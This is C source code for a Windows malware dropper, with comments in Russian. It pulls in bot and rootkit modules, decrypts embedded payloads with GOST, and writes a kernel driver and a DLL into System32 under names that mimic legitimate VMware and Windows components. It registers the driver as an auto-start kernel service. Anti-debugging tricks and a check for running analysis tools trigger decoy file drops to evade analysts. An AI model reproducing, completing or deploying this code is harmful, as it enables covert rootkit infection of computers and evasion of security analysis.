#include <windows.h>
#include <sys/types.h>
#include <sys/timeb.h>
#include <Tlhelp32.h>
#include <stdio.h>
#include <stdarg.h>

#ifdef _DEBUG_
#define MSG(a) MessageBox(0,a,"Debug",0);
#else
#define MSG(a)
#endif

#include "..\bot.c"
#include "..\rootkit.c"
#include "..\bin_crypter\gost.h"
#include "dropper.h"
#ifdef _DEBUG_
void GET_ERROR(ULONG ErrorCode,
			   char *a)
{
    TCHAR szBuf[180]= { 0 };
     LPVOID lpMsgBuf;
    DWORD ERROR_DW = ErrorCode;
    FormatMessage(
    FORMAT_MESSAGE_ALLOCATE_BUFFER |
    FORMAT_MESSAGE_FROM_SYSTEM,
    NULL,
    ERROR_DW,
    MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
    (LPTSTR) &lpMsgBuf,
    0, NULL );
    wsprintf(szBuf,"Ошибка %d: %s",ERROR_DW, lpMsgBuf);
    MessageBox(NULL, szBuf, a, MB_OK);
}
#else
#define GET_ERROR
#endif
//------------------------------------------------------------------------------------
BOOL DrvRun(char *path)
{
	SC_HANDLE hServiceMan = 0,hService = 0;
	SC_LOCK scLock = 0;
	BOOLEAN bRet = FALSE;
	ULONG ErrorCode = 0;

	__try {
		__asm { 
			xor eax,eax
			mov [eax],eax
		};
	}	__except(EXCEPTION_EXECUTE_HANDLER){
		hServiceMan = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS  );
		if(!hServiceMan)
		{
			GET_ERROR(GetLastError(),"OpenSCManager");
			bRet = FALSE;
			goto end;
		}
		
		scLock = LockServiceDatabase(hServiceMan);
		if(!scLock)
		{
			GET_ERROR(GetLastError(),"LockServiceDatabase ");
			bRet = FALSE;
			goto end;
		}

CreatSrv:
		hService = CreateService(
			hServiceMan,			// дескриптор менеджера сервисов
			"vmnetx86",				// внутреннее имя сервиса, используемое SCM
			"vmnetx86",				// внешнее имя сервиса в панели управления
			SERVICE_ALL_ACCESS,		// полный контроль над сервисом
			SERVICE_KERNEL_DRIVER,	// сервис является драйвером
			SERVICE_AUTO_START,		// сервис запускается автоматически
			SERVICE_ERROR_NORMAL,	// все ок 
			path,
			NULL,NULL,NULL,NULL,NULL);
		

		if(!hService)
		{
			ErrorCode = GetLastError();
			if(ErrorCode == ERROR_SERVICE_EXISTS)
				goto OpenSrv;
		
			GET_ERROR(ErrorCode,"CreateService");
			bRet = FALSE;
			goto end;
		}
		
		UnlockServiceDatabase(scLock);
		CloseServiceHandle(hService);

OpenSrv:
		hService = OpenService(hServiceMan,"vmnetx86",SERVICE_ALL_ACCESS);
		if(!hService)
		{
			ErrorCode = GetLastError();
			if(ErrorCode == ERROR_SERVICE_DOES_NOT_EXIST)
				goto CreatSrv;
			GET_ERROR(ErrorCode,"OpenService");
			bRet = FALSE;
			goto end;
		}

		if(scLock)
			UnlockServiceDatabase(scLock);
		if(!hService)
			goto OpenSrv;

		if(!StartService(hService,0,NULL))
		{
			GET_ERROR(GetLastError(),"StartService");
			bRet = FALSE;
			goto end;
		}
end:
		if(scLock)
			UnlockServiceDatabase(scLock);

		if(hServiceMan)
			CloseServiceHandle(hServiceMan);

		if(hService)
			CloseServiceHandle(hService);
	}

	return bRet;
}
//------------------------------------------------------------------------------------
BOOLEAN ProtectProcess(char *s)
{
	int i = 0;
	while(szSnifferTools[i] != NULL)
	{
		if(strcmpi(s,DeCrypt(szSnifferTools[i]))==0)
			return TRUE;
		i++;
	}
	return FALSE;
}
//------------------------------------------------------------------------------------
BOOLEAN AntiSniffer()
{
	BOOLEAN bRet = FALSE;
	ULONG i = 921;
	SYSTEMTIME SystemTime = { 0 };
	CreateToolhelp32SnapshotPtr CreateSnapshot = NULL;
	Process32NextPtr ProcessNext = NULL;
	HANDLE nSnap;
	PROCESSENTRY32 Process;
	char szProcessName [50] = { 0 };

	GetSystemTime(&SystemTime);
	srand(SystemTime.wMilliseconds+RAND32);

	__try { 
		while(i){
				GetSystemTime(&SystemTime);
				srand(SystemTime.wMilliseconds+RAND32);
				i--;
				Sleep(5);
			}
				__asm { 
					xor eax,eax
					mov [eax],eax
				}
	}	__except(EXCEPTION_EXECUTE_HANDLER)
	{
			CreateSnapshot	= (PVOID)GetProcAddress(GetModuleHandle("kernel32.dll"),"CreateToolhelp32Snapshot");
			ProcessNext		= (PVOID)GetProcAddress(GetModuleHandle("kernel32.dll"),"Process32Next");
			nSnap = CreateSnapshot(TH32CS_SNAPPROCESS,0);
			if(nSnap !=  INVALID_HANDLE_VALUE){
				Process.dwSize = sizeof(PROCESSENTRY32);
				if(!Process32First(nSnap,&Process))
					return FALSE;
				__try
				{
					do {
						if(ProtectProcess((char *)Process.szExeFile))
						{
							return FALSE;
						}
					}	while(Process32Next(nSnap,&Process));
				}	__except(EXCEPTION_EXECUTE_HANDLER){
					return FALSE;
				}
			}
	}

	return TRUE;
}
//------------------------------------------------------------------------------------
PFileStorage DeCryptBuffer(PFileStorage pFileStor)
{
	ULONG_PTR pOutMem = NULL,pMem = 0;
	ULONG i = 0;
	ULONG in[2],out[2];
	ULONG_PTR pDecryptMem;
	ULONG Key[8];

	pDecryptMem = (ULONG_PTR)((PBYTE)pFileStor + sizeof(struct _FILE_STORAGE));

	memcpy(&Key,pFileStor->nKeyArray,32);
#ifdef _CRYPTER_
	printf("[+] DeCryptBuffer : Buffer size : [ %d ] , +Append : [ %d ]\n",		pFileStor->FileSize,pFileStor->BufferSize);
#endif

	pOutMem = (ULONG_PTR)malloc(pFileStor->BufferSize);
	memset(pOutMem,0,pFileStor->BufferSize);
	pMem = pOutMem;
	for( i = 0; i <= pFileStor->BufferSize / 8; i++)
	{
		in[0] = (ULONG)*pDecryptMem;
		(ULONG)*pDecryptMem++;
		in[1] = (ULONG)*pDecryptMem;
		(ULONG)*pDecryptMem--;
		gostdecrypt(in,out,Key);
		memcpy(pDecryptMem,out,8);
					
		pDecryptMem++;
		pDecryptMem++;
#ifdef _CRYPTER_
		if((i % 32) != 0)
			printf("..");
		else printf("\n");	
#endif
	}
	return pFileStor;
}
//------------------------------------------------------------------------------------
BOOLEAN DropDriver()
{
	BOOLEAN bRet = FALSE;
	PFileStorage pDriver = (PFileStorage)&vmnetx86;
	HANDLE hFile = NULL;
	ULONG nWritten = 0;
	TCHAR lpszPath[_MAX_PATH];
	DWORD dwResult = ExpandEnvironmentStrings( "%SYSTEMROOT%\\System32\\drivers\\vmnetx86.sys", lpszPath, _MAX_PATH); 
	PVOID pPtr;

	DeleteFile(lpszPath);
	pDriver = DeCryptBuffer(pDriver);
	if(pDriver)
	{
		hFile = CreateFile((LPCSTR)lpszPath,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,NULL);
		if(!hFile)
		{
			bRet =  FALSE;
			goto end;
		}
		pPtr = (PVOID)((PCHAR)pDriver + sizeof(struct _FILE_STORAGE));
		if(!WriteFile(hFile,pPtr,pDriver->FileSize,&nWritten,0))
		{
			bRet = FALSE;
			goto end;
		}
	}
end:
	if(hFile)
		CloseHandle(hFile);
	return TRUE;
}
//------------------------------------------------------------------------------------
BOOLEAN DropDll()
{
	BOOLEAN bRet = FALSE;
	PFileStorage pDriver = (PFileStorage)&wzcsapi;
	HANDLE hFile = NULL;
	ULONG nWritten = 0;
	TCHAR lpszPath[_MAX_PATH];
	DWORD dwResult = ExpandEnvironmentStrings( "%SYSTEMROOT%\\System32\\wzcsapi-SP2.dll", lpszPath, _MAX_PATH); 
	PVOID pPtr;

	DeleteFile(lpszPath);
	pDriver = DeCryptBuffer(pDriver);
	if(pDriver)
	{
		hFile = CreateFile((LPCSTR)lpszPath,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,NULL);
		if(!hFile)
		{
#ifdef _DEBUG_
			hFile = (HANDLE)GetLastError();
#endif
			bRet = FALSE;
			goto end;
		}
		pPtr = (PVOID)((PCHAR)pDriver + sizeof(struct _FILE_STORAGE));
		if(!WriteFile(hFile,pPtr,pDriver->FileSize,&nWritten,0))
		{
			bRet = FALSE;
			goto end;
		}
	}
end:
	if(hFile)
		CloseHandle(hFile);
	return TRUE;
}
//------------------------------------------------------------------------------------
void Fake2()
{
	BOOLEAN bRet = FALSE;
	PFileStorage pDriver = (PFileStorage)&vmnetx86;
	char *name = malloc(20);
	HANDLE hFile = NULL;
	ULONG nWritten = 0;
	TCHAR lpszPath[_MAX_PATH];
	DWORD dwResult = ExpandEnvironmentStrings( "%SYSTEMROOT%\\System32\\drivers\\", lpszPath, _MAX_PATH); 
	PVOID pPtr;
	
	memset(name,0,20);
	GetRandomStr(10,0x61,0x70,(char *)name);
	strcat(name,".sys");
	strcat(lpszPath,name);
	
	pDriver = DeCryptBuffer(pDriver);
	memcpy((PCHAR)pDriver + sizeof(struct _FILE_STORAGE),GetModuleHandle(NULL),150);
	if(pDriver)
	{
		hFile = CreateFile((LPCSTR)lpszPath,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,NULL);
		if(!hFile)
		{
#ifdef _DEBUG_
			hFile = (HANDLE)GetLastError();
#endif
		}
		pPtr = (PVOID)((PCHAR)pDriver + sizeof(struct _FILE_STORAGE));
		WriteFile(hFile,pPtr,pDriver->FileSize,&nWritten,0);
	}

}
//------------------------------------------------------------------------------------
void Fake()
{
	BOOLEAN bRet = FALSE;
	PFileStorage pDriver = (PFileStorage)&wzcsapi;
	char *name = malloc(20);
	HANDLE hFile = NULL;
	ULONG nWritten = 0;
	TCHAR lpszPath[_MAX_PATH];
	DWORD dwResult = ExpandEnvironmentStrings( "%SYSTEMROOT%\\System32\\", lpszPath, _MAX_PATH); 
	PVOID pPtr;

	memset(name,0,20);
	GetRandomStr(10,0x61,0x70,(char *)name);
	strcat(name,".dll");
	strcat(lpszPath,name);
	
	pDriver = DeCryptBuffer(pDriver);
	memcpy((PCHAR)pDriver + sizeof(struct _FILE_STORAGE),GetModuleHandle(NULL),150);
	if(pDriver)
	{
		hFile = CreateFile((LPCSTR)lpszPath,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,NULL);
		if(!hFile)
		{
#ifdef _DEBUG_
			hFile = (HANDLE)GetLastError();
#endif
		}
		pPtr = (PVOID)((PCHAR)pDriver + sizeof(struct _FILE_STORAGE));
		WriteFile(hFile,pPtr,pDriver->FileSize,&nWritten,0);
	}

}
//------------------------------------------------------------------------------------
void AllFake()
{
	Fake();
	Fake2();
}
//------------------------------------------------------------------------------------
PVOID AntiDebug(LPVOID lparam)
{
	TCHAR lpszPath[_MAX_PATH];
	DWORD dwResult = ExpandEnvironmentStrings( "%SYSTEMROOT%\\System32\\drivers\\vmnetx86.sys", lpszPath, _MAX_PATH); 

	// anti debug triks
	__try {
		int *i = 0;
		*i = 0;
	}	__except(EXCEPTION_EXECUTE_HANDLER){

		if(!AntiSniffer())
		{
			AllFake();
		}	else	{
			// init gost decrypt system
			kboxinit();	
			if(!DropDriver())
			{
				if(!AntiSniffer())
				{
					AllFake();
					return 0;
				}
			}	else	{
				if(!DropDll())
				{
					if(!AntiSniffer())
					{
						AllFake();
						return 0;
					}
				}
			}
		}
	}

	DrvRun(lpszPath);

	return 0;
}
//------------------------------------------------------------------------------------
int WINAPI WinMain(HINSTANCE hInst,HINSTANCE hPrevInst,LPSTR lpCmdLine,int nShowCmd)
{
	ULONG nThreadId = 0;

	AntiDebug(0);

	return 0;
}